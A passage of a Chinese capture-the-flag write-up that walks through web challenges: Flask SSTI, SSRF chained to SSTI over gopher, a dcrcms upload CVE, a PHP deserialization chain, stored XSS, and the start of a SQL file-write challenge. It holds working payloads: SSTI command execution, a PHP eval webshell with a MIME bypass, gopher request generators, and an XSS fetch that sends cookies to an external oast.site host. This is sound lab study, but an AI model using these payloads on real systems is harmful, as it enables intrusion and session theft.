   > Python 标准库 `sys` 模块中的一个底层钩子函数。它允许开发者注册一个全局的**跟踪函数**，用来监控和拦截 Python 代码在执行时的几乎所有内部事件。

   意思是：

   1. 开启函数调用监听；
   2. 渲染传入的 `submit` 参数内容；
   3. 在模板执行过程中，只要调用函数，就交给 `trace_calls()` 检查；
   4. 关闭函数调用监听。

3. **看 flag 返回逻辑**

   根目录 `/` 路由的 `index()` 函数中，关闭函数调用监听后进入判断：

   ```python
   if BoleanFlag:
       return jsonify({"flag": RealFlag})
   return jsonify({"status": "OK"})
   ```

   所以这里的逻辑是如果 `BoleanFlag` 为 `True`，后端就会返回 flag：

   ```python
   return jsonify({"flag": RealFlag})
   ```

   > `jsonify()` 是 Flask 提供的函数，用来把 Python 字典转换成 JSON 响应。
   >
   > 比如：
   >
   > ```python
   > jsonify({"flag": RealFlag})
   > ```
   >
   > 返回到前端大概就是：
   >
   > ```json
   > {"flag":"flag{...}"}
   > ```

   在源码里寻找 `BoleanFlag` 字样，最前面有：

   ```py
   BoleanFlag = False
   ```

   中间还有：

   ```python
   def trace_calls(frame, event, arg):
     if event == 'call':
       func_name = frame.f_code.co_name
       # print(func_name)
       if func_name in need_List:
         need_List[func_name] = 1
       if all(need_List.values()):
         global BoleanFlag
         BoleanFlag = True
     return trace_calls
   ```

   分析 `trace_calls()` 函数：

   1. 先看函数定义：

      ```python
      def trace_calls(frame, event, arg):
      ```

      这是一个自定义的跟踪函数，会被前面的：

      ```python
      sys.settrace(trace_calls)
      ```

      注册给 Python 解释器。

      注册之后，Python 在执行代码时会自动调用 `trace_calls()`，并传入三个参数：

      - `frame`：当前执行环境，可以从里面取到当前函数名。
      - `event`：当前事件类型，比如函数调用、函数返回、异常等。
      - `arg`：事件附带的数据，这题里用不上。

      **注：** 这三个参数是 `sys.settrace()` 对跟踪函数的格式要求，Python 解释器在触发监听时，会自动按顺序传入这 3 个参数，并非人为控制含义。

   2. 接着判断有没有调用函数：

      ```python
      if event == 'call':
          func_name = frame.f_code.co_name
      ```

      > `frame` 表示当前正在被调用的那个函数的信息包。
      >
      > `frame.f_code` 表示从这个信息包里取出代码信息，比如函数名、文件名、行号等。
      >
      > `frame.f_code.co_name` 表示从代码信息里取出函数名。

      `call` 表示函数调用事件，所以这段代码只判断有没有调用函数。如果存在调用函数，就取出当前被调用函数的函数名存入 `func_name` 里面。

   3. 然后判断函数名是否在 `need_List` 里面：

      ```python
      if func_name in need_List:
        need_List[func_name] = 1
      ```

      + 在前面源码中找 `need_List` ：

        ```python
        func_List = ["get_close_matches", "dedent", "fmean", "listdir", "search", "randint", "load", "sum", "findall", "mean", "choice"]
        need_List = random.sample(func_List, 5)
        need_List = dict.fromkeys(need_List, 0)
        ```

        > `random.sample()`：`random` 标准库模块里的函数，用来从一个序列中随机抽取指定数量的元素，并且不会重复。
        >
        > `dict.fromkeys()`：Python 内置 `dict` 字典类型的方法，用来根据一组 key 快速创建字典，并给这些 key 设置相同的初始 value。

        意思是从 `func_List` 这个列表里随机抽 5 个函数名出来，并把刚刚抽出来的列表变成字典，并且每个值都设置成 `0`。例如：

        ```python
        {
          "dedent": 0,
          "listdir": 0,
          "search": 0,
          "mean": 0,
          "choice": 0
        }
        ```

      如果当前调用的函数名在 `need_List` 里面，就执行：

      ```python
      need_List[func_name] = 1
      ```

      把它对应的值改成 `1`。

      例如调用到了 `mean()`，就会变成：

      ```python
      {
        "dedent": 0,
        "listdir": 0,
        "search": 0,
        "mean": 1,
        "choice": 0
      }
      ```

   4. 最后判断是否全部调用完成：

      ```python
      if all(need_List.values()):
        global BoleanFlag
        BoleanFlag = True
      ```

      > `need_List.values()` 表示取出字典里所有的值。
      >
      > `all()` 是 Python 内置函数，用来判断里面的值是否全部为真。

      只有当 5 个函数都被调用过后，`need_List` 才会变成类似这样：

      ```python
      {
        "dedent": 1,
        "listdir": 1,
        "search": 1,
        "mean": 1,
        "choice": 1
      }
      ```

      它的值就是：

      ```python
      [1, 1, 1, 1, 1]
      ```

      这时：

      ```python
      all(need_List.values())
      ```

      才会返回 `True`。

      然后执行：

      ```python
      global BoleanFlag
      BoleanFlag = True
      ```

      `global BoleanFlag` 表示这里修改的是外面的全局变量 `BoleanFlag`，而不是在函数内部新建一个局部变量。

   所以 `trace_calls()` 的作用就是：

   1. 监听函数调用，取出被调用函数的名字。
   2. 如果这个函数名在 `need_List` 里，就把它标记为 `1`。
   3. 当随机抽到的 5 个函数都被调用过后，就把 `BoleanFlag` 改成 `True`。

   而且当 `BoleanFlag` 被改成 `True`，后端就会返回 flag：

   ```python
   return jsonify({"flag": RealFlag})
   ```

4. **构造 payload**

   先前分析可以以 POST 方式注入 `submit` 参数内容，且存在 SSTI，也就是可以实现 Python 代码执行。

   这里可以把列表中的 11 个函数全部定义一遍，然后全部调用一遍，例如：

   ```python
   {{ url_for.__globals__.__builtins__.exec("def get_close_matches(): pass\ndef dedent(): pass\ndef fmean(): pass\ndef listdir(): pass\ndef search(): pass\ndef randint(): pass\ndef load(): pass\ndef sum(): pass\ndef findall(): pass\ndef mean(): pass\ndef choice(): pass\nget_close_matches();dedent();fmean();listdir();search();randint();load();sum();findall();mean();choice()") }}
   ```

5. **非预期构造 payload**

   或者另一种思路，直接利用可以实现 Python 代码执行，构造 payload 实现 BoleanFlag 在全局变量里为真：

   ```python
   {{ url_for.__globals__.__builtins__.exec("import __main__; __main__.BoleanFlag=True") }}
   "import __main__; __main__.BoleanFlag=True"
   ```

   但是失败了，说明题目给的源码和题目实际源码可能不一致。

   既然已知题目会渲染传入的 payload，那就可以当作盲 SSTI 做了，传入：

   ````python
   {{ url_for.__globals__.os.popen('mkdir -p /app/static;cat /app/app.py > /app/static/1.txt').read() }}
   ````

   访问 `/static/1.txt` 拿真的 app.py 的源码，看到源码中实际是：

   ```python
   if subSRHMT9vEcqII7VnI:
       return jsonify({"flag": subgoEpNWu5twvIYEIR})
   ```

   所以实际应该修改 payload 实现 subSRHMT9vEcqII7VnI 在全局变量里为真：

   ```python
   {{ url_for.__globals__.__builtins__.exec("import __main__; __main__.subSRHMT9vEcqII7VnI=True") }}
   ```

   发送后拿到 flag。

   还可以直接构造 payload 得到 subgoEpNWu5twvIYEIR 的值：

   ```python
   {{ url_for.__globals__.__builtins__.exec("import __main__;open('/app/static/2.txt','w').write(__main__.subgoEpNWu5twvIYEIR)") }}
   ```

   访问 `/static/2.txt` 得到 flag。

## WEEK 4

### SSTI 在哪里？

提供了 `index.php`、`app.py` 和 `internal_web.py` 这三个主要源码文件。

1. **先看路由**

   在 `app.py` 和 `internal_web.py` 中分别存放了两个 `/` 路由。

   1. **`app.py`：**

      ```python
      @app.route('/', methods=['GET','POST'])
      def handle_request():  
          name = request.form.get('name','')
          data = {"template":name}
          res = requests.post('http://localhost:5001/',data=data).text
          return res
      
      if __name__ == '__main__':
          app.run(host='0.0.0.0', port=5000)
      ```

      即定义了 `/` 路由，允许 GET 和 POST 访问，且会从 POST 表单参数里取 `name`，也就是请求体里要这样：

      ```http
      name=xxx
      ```

      如果没有传 `name`，默认是空字符串 `''`。

      然后把传入的 `name` 包装成一个新的 POST 参数：

      ```http
      template=传入的name内容
      ```

      最后服务器自己向内网 `http://localhost:5001/` 发 POST 请求，相当于访问：

      ```http
      POST http://localhost:5001/
      template=传入的name内容
      ```

      然后取返回内容。

      最后的 `app.run(host='0.0.0.0', port=5000)` 说明这是开放在靶机页面的 5000 端口。

   2. **`internal_web.py`：**

      ```python
      @app.route('/', methods=['GET','POST'])
      def index():
          template = request.form.get('template', 'Hello World!')
          return render_template_string(template)
      
      if __name__ == '__main__':
          app.run(host='127.0.0.1', port=5001)
      ```

       这里同样定义了 `/` 路由，允许 GET 和 POST 访问，并且会从 POST 表单参数里取 `template`。

      关键在：

      ```python
      return render_template_string(template)
      ```

      > `render_template_string()` 是 Flask/Jinja2 提供的模板渲染函数，它会把传进去的字符串当成 Jinja2 模板来解析。

      这里说明 `template` 的值如果可控，将会造成 SSTI。

      最后的 `app.run(host='0.0.0.0', port=5001)` 说明这是开放在内网 `http://127.0.0.1` 的 5001 端口。

2. **找入口参数**

   在 `index.php` 中找到：

   ```php
   if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['url'])) {
       $url = $_POST['url'];
   ```

   说明 `index.php` 即 `/` 路由中存在可控的 POST 参数 `url`，继续看这个可控参数有什么用：

   ```php
   $ch = curl_init();
   //配置curl
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
   curl_setopt($ch, CURLOPT_TIMEOUT, 10);
       
   $result = curl_exec($ch);
   curl_close($ch);
   ```

   > **curl_init()**
   >
   > PHP 里用来初始化一个 cURL 请求对象的函数，后面才能用它去配置并访问 URL。

   > **curl_setopt()**
   >
   > PHP 里用来给 cURL 请求设置参数/选项的函数，比如设置访问的 URL、是否回显结果、是否跟随跳转。

   > **curl_exec()**
   >
   > PHP 里用来真正执行 cURL 请求的函数，会让服务器去访问前面设置好的 URL。

   > **curl_close()**
   >
   > PHP 里用来关闭 cURL 请求对象、释放资源的函数，请求执行完后一般会调用它。

   因此，这个可控的 POST 参数 `url` 可以实现 SSRF。

3. **构造 payload**

   首先明确本题 payload 的构造思路是：

   ```txt
   index.php SSRF
     ↓
   http://127.0.0.1:5000/
     ↓
   app.py 把 name 转成 template
     ↓
   http://localhost:5001/
     ↓
   internal_web.py render_template_string(template)
     ↓
   SSTI 拿 flag
   ```

   由于要往内网 `http://localhost:5001/` 发 POST 请求，所以要用 `gopher://` 构造原始 HTTP POST 请求。

   先构造测试 SSTI 的 HTTP 请求：

   ```http
   POST / HTTP/1.1
   Host: 127.0.0.1:5000
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 12
   
   name={{7*7}}
   ```

   转成 `gopher://` 伪协议格式：

   ```python
   import urllib.parse
   
   # 构造 POST 数据
   post_data = "name={{7*7}}"
   content_length = len(post_data)
   
   # 构造 HTTP 请求（请求体上面的换行不要省掉）
   gopher_payload = f"""POST / HTTP/1.1
   Host: localhost:5000
   Content-Type: application/x-www-form-urlencoded
   Content-Length: {content_length}
   
   {post_data}"""
   
   # 编码为 Gopher 格式
   gopher_payload = gopher_payload.replace("\n", "\r\n")
   gopher_url = "gopher://localhost:5000/_" + urllib.parse.quote(gopher_payload)
   print(gopher_url)
   ```

   运行上述 Python 脚本得到：

   ```txt
   gopher://localhost:5000/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20localhost%3A5000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Aname%3D%7B%7B7%2A7%7D%7D
   ```

   但 payload 失败了，返回 500 的状态码。

   这里不是 payload 的问题，纯源码误导，可以先输入：

   ```txt
   file:///app/internal_web.py
   ```

   看到其真实源码中是：

   ```python
   if __name__ == '__main__':
       app.run(host='127.0.0.1', port=port_num)
   ```

   并没有明确写出运行端口在 5001。

   而且输入：

   ```txt
   http://localhost:5001/
   ```

   后无回显，更加证实了本题并没有运行 5001 端口。

   放入 BurpSuite 中爆破后，在输入：

   ```txt
   http://localhost:60024/
   ```

   时，才会返回 `Hello World!`，说明 60024 才是真正运行着的端口。

   修改 Python 脚本为：

   ```python
   import urllib.parse
   
   # 构造 POST 数据
   post_data = "template={{7*7}}"
   content_length = len(post_data)
   
   # 构造 HTTP 请求（请求体上面的换行不要省掉）
   gopher_payload = f"""POST / HTTP/1.1
   Host: localhost:60024
   Content-Type: application/x-www-form-urlencoded
   Content-Length: {content_length}
   
   {post_data}"""
   
   # 编码为 Gopher 格式
   gopher_payload = gopher_payload.replace("\n", "\r\n")
   gopher_url = "gopher://localhost:60024/_" + urllib.parse.quote(gopher_payload)
   print(gopher_url)
   ```

   运行得到：

   ```txt
   gopher://localhost:60024/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20localhost%3A60024%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2016%0D%0A%0D%0Atemplate%3D%7B%7B7%2A7%7D%7D
   ```

   输入后返回结果中得到 `49`，说明 payload 成功了。

   接着运行：

   ```python
   import urllib.parse
   
   # 构造 POST 数据
   post_data = "template={{lipsum.__globals__['os'].popen('cat /flag').read()}}"
   content_length = len(post_data)
   
   # 构造 HTTP 请求（请求体上面的换行不要省掉）
   gopher_payload = f"""POST / HTTP/1.1
   Host: localhost:60024
   Content-Type: application/x-www-form-urlencoded
   Content-Length: {content_length}
   
   {post_data}"""
   
   # 编码为 Gopher 格式
   gopher_payload = gopher_payload.replace("\n", "\r\n")
   gopher_url = "gopher://localhost:60024/_" + urllib.parse.quote(gopher_payload)
   print(gopher_url)
   ```

   得到：

   ```txt
   gopher://localhost:60024/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20localhost%3A60024%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2063%0D%0A%0D%0Atemplate%3D%7B%7Blipsum.__globals__%5B%27os%27%5D.popen%28%27cat%20/flag%27%29.read%28%29%7D%7D
   ```

   输入后拿到 flag。

### 武功秘籍

题目有提示到是一个 CVE 漏洞，且进去后页面显示是稻草人企业程序，可以直接去浏览器搜关键词：

```txt
稻草人企业 CVE漏洞
```

搜出来第一个就是 [dcrcms 文件上传漏洞(CNVD-2020-27175)](https://blog.csdn.net/xy_wjyjw/article/details/134067139)，接下来按人家博客里的一步一步复现即可。

但由于 CSDN 搜出来的博客基本都要付费（~~这 CSDN 咋这么坏啊~~），这里重新搜了：

```txt
CNVD-2020-27175复现 -csdn
```

找到了 https://www.wlaqsys.com/archives/5837 这个网站有详细的复现步骤：

1. 点击 `产品中心` 或访问 `/dcr/login.htm` 进入网站后台登录界面，用但是本题的用户名密码不是复现中的 `admin/123456`。

   不过密码同样是弱密码，本题的用户名密码为 `admin/admin`。

2. 进入网站管理中心后，点击 `添加新闻类`：

   ![image-20260529213832078](https://img.yanxisishi.top/images/2026/06/image-20260529213832078.png)

   然后随便取一个分类名 `123` 后点击 `添加分类`：

   ![image-20260529213936984](https://img.yanxisishi.top/images/2026/06/image-20260529213936984.png)

   然后返回后台首页，点击 `添加新闻`：

   ![image-20260529214053937](https://img.yanxisishi.top/images/2026/06/image-20260529214053937.png)

   随便起一个新闻标题 `yanxi`，产品类别一般自动选择了刚刚新添加的 `123` 分类，重点是在 `缩略图：` 这里的选择文件处，可以上传一句话木马 shell.php：

   ```php
   <?php eval($_POST[1]);?>
   ```

   上传完成后，在 `新闻内容` 处随意输入 `123`，接着点击最底下的 `添加新闻` 即可：

   ![image-20260529214743903](https://img.yanxisishi.top/images/2026/06/image-20260529214743903.png)

   返回提示：

   ```txt
   ·你上传的文件文件类型[text/x-php]不在允许上传的类型之内
   ```

   说明对文件类型有要求，再次上传 shell.php 并点击添加新闻，同时要用 BurpSuite 抓包，修改文件类型为：

   ```http
   Content-Type: image/jpeg
   ```

   然后放行：

   ![image-20260529215558609](https://img.yanxisishi.top/images/2026/06/image-20260529215558609.png)

   回到浏览器中找上传文件的存放地址，依次点击：

   ```txt
   系统管理 -> 文件管理器 -> uploads -> news -> 2026_05_29
   ```

   ![image-20260529220014618](https://img.yanxisishi.top/images/2026/06/image-20260529220014618.png)

   ![](https://img.yanxisishi.top/images/2026/06/image-20260529220113112.png)

   ![image-20260529220254135](https://img.yanxisishi.top/images/2026/06/image-20260529220254135.png)

   在这个日期命名的文件夹中可以找到刚刚上传的 PHP 文件，点进去后页面空白，说明上传成功，接着 POST 传入：

   ```http
   1=system('cat /flag');
   ```

   拿到 flag。

### 小羊走迷宫

 ```php
 <?php
 include "flag.php";
 error_reporting(0);
 class startPoint{
     public $direction;
     function __wakeup(){
         echo "gogogo出发咯 ";
         $way = $this->direction;
         return $way();
     }
 }
 class Treasure{
     protected $door;
     protected $chest;
     function __get($arg){
         echo "拿到钥匙咯，开门！ ";
         $this -> door -> open();
     }
     function __toString(){
         echo "小羊真可爱! ";
         return $this -> chest -> key;
     }
 }
 class SaySomething{
     public $sth;
     function __invoke()
     {
         echo "说点什么呢 ";
         return "说： ".$this->sth;
     }
 }
 class endPoint{
     private $path;
     function __call($arg1,$arg2){
         echo "到达终点！现在尝试获取flag吧"."<br>";
         echo file_get_contents($this->path);
     }
 }
 
 if ($_GET["ma_ze.path"]){
     unserialize(base64_decode($_GET["ma_ze.path"]));
 }else{
     echo "这个变量名有点奇怪，要怎么传参呢？";
 }
 ?> 
 ```

1. **先看对可控 GET 变量的限制**

   ```php
   if ($_GET["ma_ze.path"]){
       unserialize(base64_decode($_GET["ma_ze.path"]));
   }
   ```

   看起来需要传入：

   ```php
   ?ma_ze.path=payload
   ```

   但是 PHP 解析 GET 参数名时，`.` 会被转换成 `_`，所以直接传 `ma_ze.path` 会变成 `ma_ze_path`，无法对应到 `$_GET["ma_ze.path"]`。

   需要用：

   ```php
   ?ma[ze.path=payload
   ```

   因为 `[` 会被转换成 `_`，但后面的 `.path` 不会再被转换，所以最终等价于：

   ```php
   $_GET["ma_ze.path"]
   ```

   另外这里还有：

   ```php
   unserialize(base64_decode($_GET["ma_ze.path"]));
   ```

   所以 payload 需要先序列化，再 base64 编码。

2. **找链子终点**

   终点在 `endPoint::__call()`：

   ```php
   class endPoint{
       private $path;
       function __call($arg1,$arg2){
           echo "到达终点！现在尝试获取flag吧"."<br>";
           echo file_get_contents($this->path);
       }
   }
   ```

   > **__call()**
   >
   > 当调用一个对象中不存在或不可访问的方法时，会自动触发 `__call()`。

   这里的关键代码是：

   ```php
   echo file_get_contents($this->path);
   ```

   所以需要让：

   ```php
   endPoint::$path = "flag.php"
   ```

   然后再调用一个 `endPoint` 中不存在的方法，比如：

   ```php
   $endPoint对象->open();
   ```

   就可以触发 `endPoint::__call()`。

3. **触发 `endPoint::__call()`**

   找到 `Treasure::__get()`：

   ```php
   function __get($arg){
       echo "拿到钥匙咯，开门！ ";
       $this -> door -> open();
   }
   ```

   > **__get()**
   >
   > 当读取一个对象中不存在或不可访问的属性时，会自动触发 `__get()`。

   这里的关键代码是：

   ```php
   $this -> door -> open();
   ```

   如果让：

   ```php
   Treasure::$door = new endPoint()
   ```

   那么：

   ```php
   $this->door->open();
   ```

   就会触发 `endPoint::__call()`。

4. **触发 `Treasure::__get()`**

   找到 `Treasure::__toString()`：

   ```php
   function __toString(){
       echo "小羊真可爱! ";
       return $this -> chest -> key;
   }
   ```

   这里的关键代码是：

   ```php
   return $this -> chest -> key;
   ```

   如果让：

   ```php
   Treasure::$chest = new Treasure()
   ```

   那么读取：

   ```php
   $this->chest->key
   ```

   时，因为 `Treasure` 类里没有 `key` 这个属性，所以会触发 `Treasure::__get()`。

5. **触发 `Treasure::__toString()`**

   找到 `SaySomething::__invoke()`：

   ```php
   function __invoke()
   {
       echo "说点什么呢 ";
       return "说： ".$this->sth;
   }
   ```

   这里的关键代码是：

   ```php
   return "说： ".$this->sth;
   ```

   如果让：

   ```php
   SaySomething::$sth = new Treasure()
   ```

   那么字符串拼接时，对象会被当成字符串使用，从而触发 `Treasure::__toString()`。

6. **触发 `SaySomething::__invoke()`**

   找到 `startPoint::__wakeup()`：

   ```php
   function __wakeup(){
       echo "gogogo出发咯 ";
       $way = $this->direction;
       return $way();
   }
   ```

   > **__wakeup()**
   >
   > 对象被反序列化时，会自动触发 `__wakeup()`。

   这里的关键代码是：

   ```php
   $way = $this->direction;
   return $way();
   ```

   如果让：

   ```php
   startPoint::$direction = new SaySomething()
   ```

   那么 `$way()` 就相当于把 `SaySomething` 对象当成函数调用，从而触发 `SaySomething::__invoke()`。

   最终链子就是：

   ```php
   startPoint::__wakeup()
   -> SaySomething::__invoke()
   -> Treasure::__toString()
   -> Treasure::__get()
   -> endPoint::__call()
   -> file_get_contents("flag.php")
   ```

7. **编写 exp**

   其中使用了 `protected` 和 `private` 的属性，使用 `function __construct()` 为其赋值。

   ```php
   <?php
   class startPoint{
       public $direction;
   }
   
   class Treasure{
       protected $door;
       protected $chest;
   
       public function __construct(){
           $this->door = new endPoint();
           $this->chest = new Treasure();
       }
   }
   
   class SaySomething{
       public $sth;
   }
   
   class endPoint{
       private $path;
   
       public function __construct(){
           $this->path = "flag.php";
       }
   }
   
   $a = new startPoint();
   $a -> direction = new SaySomething();
   $a -> direction -> sth = new Treasure();
   
   echo base64_encode(serialize($a));
   ```

   但这里存在问题：

   ```php
   public function __construct(){
       $this->door = new endPoint();
       $this->chest = new Treasure();
   }
   ```

   `new Treasure()` 会再次进入 `Treasure::__construct()`，然后里面又 `new Treasure()`，无限递归，最后会内存爆掉，payload 生成不出来。

   所以这里需要写成可控构造，不要让它自己无限创建：

   ```php
   public function __construct(){
       static $yanxi = true;
       if ($yanxi) {
           // 第一次 new Treasure()，创建外层 Treasure
           $yanxi = false;
           $this->door = null;
           $this->chest = new Treasure();
       } else {
           // 第二次 new Treasure()，创建内层 Treasure
           $this->door = new endPoint();
           $this->chest = null;
       }
   }
   ```

   所以 exp 就是：

   ```php
   <?php
   class startPoint{
       public $direction;
   }
   
   class Treasure{
       protected $door;
       protected $chest;
   
       public function __construct(){
       static $yanxi = true;
       if ($yanxi) {
           // 第一次 new Treasure()，创建外层 Treasure
           $yanxi = false;
           $this->door = null;
           $this->chest = new Treasure();
       } else {
           // 第二次 new Treasure()，创建内层 Treasure
           $this->door = new endPoint();
           $this->chest = null;
       }
   }
   }
   
   class SaySomething{
       public $sth;
   }
   
   class endPoint{
       private $path;
   
       public function __construct(){
           $this->path = "flag.php";
       }
   }
   
   $a = new startPoint();
   $a -> direction = new SaySomething();
   $a -> direction -> sth = new Treasure();
   
   echo base64_encode(serialize($a));
   ```

   运行得到：

   ```txt
   TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NzoiACoAZG9vciI7TjtzOjg6IgAqAGNoZXN0IjtPOjg6IlRyZWFzdXJlIjoyOntzOjc6IgAqAGRvb3IiO086ODoiZW5kUG9pbnQiOjE6e3M6MTQ6IgBlbmRQb2ludABwYXRoIjtzOjg6ImZsYWcucGhwIjt9czo4OiIAKgBjaGVzdCI7Tjt9fX19
   ```

   传入：

   ```http
   ?ma[ze.path=TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NzoiACoAZG9vciI7TjtzOjg6IgAqAGNoZXN0IjtPOjg6IlRyZWFzdXJlIjoyOntzOjc6IgAqAGRvb3IiO086ODoiZW5kUG9pbnQiOjE6e3M6MTQ6IgBlbmRQb2ludABwYXRoIjtzOjg6ImZsYWcucGhwIjt9czo4OiIAKgBjaGVzdCI7Tjt9fX19
   ```

   查看源码，拿到 flag。

### 小 E 的留言板

根据题目介绍不难猜到本题的核心是 XSS 窃取管理员的 Cookie。

进入靶机页面后，随意注册一个账号 `admin/111`，这里主要看到留言板，先尝试输入：

```html
<h1>test</h1>
```

结果发现留言内容变成了 `h1test/h1`，说明会删除 `<` 和 `>`。

在源码中找一下 `h1test/h1` 的位置：

```html
<input type="text" class="form-control" value="h1test/h1" readonly="" style="
        background: transparent;
        border: none;
        padding: 0;
        font-size: 16px;
        width: 100%;
      ">
```

所以留言所在位置不是普通文本输出，而是作为 `value` 属性被拼接到这里。

尝试用 `"` 闭合 `value` 属性，输入：

```html
" autofocus onfocus=alert(1) x="
```

返回直接变成空白了，这很正常，因为 `value` 属性被闭合成了空值，但并没有像预期的弹出 `1`，说明存在其他 WAF。

查看源码，看到：

```html
<input type="text" class="form-control" value="" auto="" on="alert(1)" x="" readonly="" style="
        background: transparent;
        border: none;
        padding: 0;
        font-size: 16px;
        width: 100%;
      ">
```

所以原先的：

````html
" autofocus onfocus=alert(1) x="
````

变成了：

```html
" auto="" on="alert(1)" x="
```

意味着 `focus` 会被删掉，需要进行双写绕过，payload 改成：

```html
" autofofocuscus onfofocuscus=alert(1) x="
```

但依旧没有弹出 `1`，看到源码：

```html
<input type="text" class="form-control" value="" autofocus="" focus="alert(1)" x="" readonly="" style="
        background: transparent;
        border: none;
        padding: 0;
        font-size: 16px;
        width: 100%;
      ">
```

说明 payload 又变成了：

```html
" autofocus="" focus="alert(1)" x="
```

说明 `on` 也被删除了，payload 改成：

```html
" autofofocuscus oonnfofocuscus=alert(1) x="
```

成功弹出 `1` 了，说明 payload 可行。

去终端拿个 interactsh 域名：

```bash
# 下载
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# 运行
~/go/bin/interactsh-client -http-only -v | grep --line-buffered "^GET"
```

得到类似 `d8h28rtt5p5ooovrmb1011qrernf6qx6q.oast.site` 。

在留言板输入：

```html
" autofofocuscus oonnfofocuscus='fetch("//d8h28rtt5p5ooovrmb1011qrernf6qx6q.oast.site/?c="+document.cookie)' x="
```

然后点击报告留言，接着回到终端拿到 flag。

### sqlupload

题目提示：

```txt
哈哈，这次我用 SQL 来管理 Upload 的文件就不会出问题了吧！
本题 FLAG 在根目录下的 flag 文件中。
```

说明本题大概率存在 SQL 注入，但是 flag 却在 `/flag` 中，一般的 SQL 注入是无法读取到根目录下去的，所以本题大概率是文件读写类型的 SQL 注入。

下载题目提供的附件，先不看 `src` 路径下的源码文件，按顺序看完这些配置文件：

1. **先看 `Dockerfile`**

   `Dockerfile` 是用来构建题目 Docker 镜像的文件，它决定了题目环境里有什么服务、源码放在哪里、flag 怎么读、权限怎么设置。

   其中：

   1. **复制源码和配置文件：**

      ```dockerfile
      COPY sources.list /etc/apt/sources.list
      
      COPY ./src/ /var/www/html/
      COPY ./init.sql /init.sql
      COPY ./start.sh /root/start.sh
      COPY ./readFlag.c /root/readFlag.c
      ```

      分别做了这些事：

      | 原文件         | 复制到容器里的位置      | 作用                                 |
      | -------------- | ----------------------- | ------------------------------------ |
      | `sources.list` | `/etc/apt/sources.list` | 配置 Ubuntu 使用哪个软件源来安装软件 |
      | `./src/`       | `/var/www/html/`        | Web 网站源码目录                     |
      | `init.sql`     | `/init.sql`             | 初始化数据库                         |
      | `start.sh`     | `/root/start.sh`        | 容器启动脚本                         |
      | `readFlag.c`   | `/root/readFlag.c`      | 读取 flag 的 C 源码                  |

   2. **编译 readFlag：**

      ```dockerfile
      RUN gcc /root/readFlag.c -o /readFlag
      ```

      把 `/root/readFlag.c` 编译成 `/readFlag`，即容器里会多一个可执行文件：

      ```txt
      /readFlag
      ```

      大概率是用来读取 `/flag` 的。

   3. **设置权限：**

      ```dockerfile
      RUN chown root:root /readFlag && chmod 4755 /readFlag
      ```

      `chown root:root /readFlag` 表示把 `/readFlag` 的所属用户和所属组都改成 `root`。

      `chmod 4755 /readFlag` 表示给 `/readFlag` 设置 SUID 权限。

      其中：

      - `4` 表示 SUID。
      - `755` 表示 root 可读写执行，其他用户可读可执行。

      因为 `/readFlag` 属于 root，又设置了 SUID，所以普通 Web 用户执行 `/readFlag` 时，会临时以 root 权限运行。

      ```dockerfile
      RUN chmod +x /root/start.sh && \
          chown -R www-data:www-data /var/www/html/ && \
          chmod -R 777 /var/www/html/
      ```

      `chmod +x /root/start.sh` 表示给 `start.sh` 添加执行权限，保证容器启动时可以执行这个脚本。

      `chown -R www-data:www-data /var/www/html/` 表示把 Web 目录的所属用户和所属组改成 `www-data`。

      + `www-data` 是 Apache / PHP 常见的运行用户。

      `chmod -R 777 /var/www/html/` 表示把 Web 目录设置成所有用户都可以读、写、执行。

      ```dockerfile
      RUN chmod g+s /var/www/html/
      ```

      这行是给 `/var/www/html/` 目录设置 SGID。

      + 对目录来说，SGID 的作用是：在这个目录下新建的文件，会继承该目录的所属组。

      因为 `/var/www/html/` 的所属组是 `www-data`，所以后面新建的文件一般也会属于 `www-data` 组。

   4. **容器启动命令：**

      ```dockerfile
      CMD ["bash", "/root/start.sh"]
      ```

      这行表示容器启动后执行：

      ```bash
      bash /root/start.sh
      ```

2. **接着看 `start.sh`**

   `start.sh` 是容器启动脚本，在本题作用是启动 MySQL、写入 flag、启动 Apache，并让容器一直保持运行。

   其中：

   ```sh
   echo "secure_file_priv=\"\"" >> /etc/mysql/mysql.conf.d/mysqld.cnf
   echo "user=root" >> /etc/mysql/mysql.conf.d/mysqld.cnf
   ```

   第一行：

   ```sql
   secure_file_priv=""
   ```

   意思是取消 MySQL 文件读写目录限制。

   > 正常情况下，MySQL 的 `secure_file_priv` 可能会限制 `LOAD_FILE()`、`INTO OUTFILE` 只能操作某个指定目录。
   >
   > 这里设置成空字符串后，通常表示 MySQL 可以在更多路径下读写文件。

   第二行：

   ```sql
   user=root
   ```

   意思是让 MySQL 服务以 `root` 用户运行。

   以及：

   ```sh
   echo $ICQ_FLAG > /flag
   chmod 600 /flag
   chown root:root /flag
   ```

   这里把 flag 写入根目录下的 `/flag` 文件。

   然后设置权限：

   ```sh
   chmod 600 /flag
   ```

   表示只有文件所有者可以读写，其他用户没有权限。

   再设置所有者：

   ```sh
   chown root:root /flag
   ```

   表示 `/flag` 属于 `root` 用户和 `root` 组。

   因此 **普通 Web 用户不能直接读 `/flag`** 。

3. **最后看 `readFlag.c`**

   这是题目作者自己写的一个 C 程序，作用是读取 `/flag` 文件并输出内容。

总结一下，普通用户没有 `/flag` 文件的读写权限，但可以通过运行 `/readFlag` 读取 `/flag` 文件并输出内容。

所以本题大概率要利用文件读写类型的 SQL 注入写入一句话木马实现 RCE。

接下来看到 `src` 目录下的核心源码：

